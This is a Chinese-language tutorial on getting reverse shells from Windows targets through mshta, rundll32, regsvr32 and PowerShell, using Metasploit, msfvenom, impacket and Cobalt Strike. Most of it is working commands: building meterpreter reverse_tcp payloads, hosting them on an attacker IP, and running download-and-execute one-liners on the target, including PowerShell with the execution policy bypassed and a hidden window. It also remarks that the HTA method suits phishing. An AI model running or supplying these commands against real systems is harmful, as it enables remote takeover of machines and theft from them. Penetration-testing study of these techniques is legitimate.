# Windows反弹shell

## 一、NC

## 二、HTA（Mshta）

### Metasploit HTA WebServer

通过`Metasploit`的`HTA Web Server`模块发起`HTA`攻击

**攻击机操作**

```bash
msfconsole
#以下均在msf框架中执行，需要输入的命令是`>`后面的命令
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set srvhost 192.168.1.106	#攻击机的IP，也就是接收shell的ip
msf6 exploit(windows/misc/hta_server) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > set target 0	#这里看option选项里的列举情况
msf6 exploit(windows/misc/hta_server) > run -j
```

生成hta脚本网址：`http://192.168.1.106:8080/qOe1oSKv.hta`（执行`run -j`命令后会出现路径及文件名）

**靶机操作**

```powershell
mshta http://192.168.1.106:8080/qOe1oSKv.hta #上面生成hta脚本的网址
```

### Msfvenom生成HTA脚本

使用`Msfvenom`生成`HTA`脚本

**攻击机操作**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.106 lport=9999 -f hta-psh -o 1.hta	#通过msfvenom生成hta脚本

python3 -m http.server	#用python3启动一个简易http服务，一定要在hta脚本生成的目录下启动

#或通过python2启动也可以
python2 -m SimpleHTTPServer
```

再打开一个终端，进入`msfconsole`

```bash
msf6 > handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.1.106 -P 9999	#注意要和msfvenom命令中的lhost和lport对应
```

**靶机操作**

```bash
mshta.exe http://192.168.1.106:8000/1.hta	#和注意文件名1.hta要和msfvenom命令中 -o 后面的文件名一致
```

### CobaltStrike生成HTA脚本

> 首先开启一个监听器，有一个头戴式耳机的图标，进入后更改两个ip地址为teamserver的IP
>
> Attack > Packages > Html Appactions > 选择上一步创建的监听器 > Powershell > Host Files > 选择生成的 evil.hta 文件 > 生成托管文件的URL地址
>
> 注意配置IP和端口号
>
> 在攻击机上访问托管文件的url地址，下载文件后进行运行即可
>
> **可钓鱼**

## 三、dll（Rundll32）

Rundll32.exe与Windows操作系统相关，它允许调用从DLL导出的函数(16位或32位)，并将其存储在适当的内存库中。

### Msfvenom生成DLL执行

**攻击机操作**

```bash
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.106 LPORT=9999 -f dll > 1.dll
#-a为指定系统位数（32or64），--platform指定操作系统，-p为指定payload，LHOST指定接收shell的IP，LPORT设置为攻击机监听端口，-f指定输出格式，> 后面为文件名

#然后启动msf，用handler开启监听
msfconsole
msf > handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.1.106 -P 9999
```

**靶机操作**

需要管理员权限开启cmd

```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.106:8000/1.dll',\"c:\1.dll\")"
#这里DownloadFile后面的网址在攻击机执行完msfvenom命令后会有提示，按照提示更改即可
rundll32 shell32.dll,Control_RunDLL C:\1.dll
```

#### 利用smb远程加载

**攻击机操作**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.106 lport=9999 -f dll -o 1.dll

impacket-smbserver dll /root/#这里的/root/是smb服务的目录
```

**靶机操作**

```bash
rundll32.exe shell32.dll,Control_RunDLL \\192.168.1.106\dll\1.dll
```

靶机执行完操作后在攻击机的msf中可以收到会话，输入`sessions`后查看对应的session id，然后通过`sessions [id]`命令获取shell。

### Metasploit SMB Delivery

通过Metasploit的SMB Delivery模块发起Rundll32攻击

**攻击机操作**

```bash
msfconsole
msf > use exploit/windows/smb/smb_delivery
msf exploit(windows/smb/smb_delivery) > set srvhost 192.168.1.106
msf exploit(windows/smb/smb_delivery) > run –j
```

**靶机操作**

```bash
rundll32.exe \\192.168.1.106\GylDS\test.dll,0 #路径在攻击机执行run命令后会得到
```

#### 利用Rundll32加载hta反弹shell

**攻击机操作**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.106 lport=9999 -f hta-psh > 1.hta
python3 -m http.server
```

**靶机操作**

```bash
bitsadmin /transfer shell http://192.168.1.106/1.hta C:\windows\temp\1.hta
rundll32.exe url.dll,OpenURL 1.hta

cd :C:\windows\temp\
rundll32.exe url.dll,OpenURL 1.hta
```

### CobaltStrike生成dll

> Attack(攻击)->Package(生成后门)->Windows可执行程序(Stageless)->选择监听器、输出格式为Windows DLL。
>
> 然后通过上述某种方法传到靶机上并运行。CS收到会话。

## Regsvr32

> Regsvr32.exe是一个命令行应用程序，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，如Windows注册表中的dll和ActiveX控件。
>
> Regsvr32.exe安装在Windows XP和Windows后续版本的`%systemroot%\System32`文件夹中

### Metasploit Web Delivery

**攻击机操作**

```bash
msfconsole
msf > use exploit/multi/script/web_delivery
msf exploit (web_delivery)> set srvhost 192.168.1.106
msf exploit (web_delivery)> set target 3 #可以show targets，选择regsvr32对应的编号
msf exploit (web_delivery)> set payload windows/x64/meterpreter/reverse_tcp
msf exploit (web_delivery)> set lhost 192.168.1.106
msf exploit (web_delivery)> run –j
```

**靶机操作**

```bash
regsvr32 /s /n /u /i:http://192.168.78.117:8080/NE67gb2mbfQt.sct scrobj.dll #这条命令msf在执行run后会出现提示
```

## PowerShell

### Msfvenom生成Powershell脚本

**攻击机**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.106 lport=9999 -f psh-reflection -o 1.ps1

python3 -m http.server
```

再打开一个终端

```bash
msfconsole
msf6 > handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.1.106 -P 9999	#注意要和msfvenom命令中的lhost和lport对应
```

**靶机操作**

```bash
powershell -windowstyle hidden -exec bypass -c "IEX (New-ObjectNet.WebClient).DownloadString('http://192.168.1.106/shell.ps1');1.ps1";
```

msf收到会话。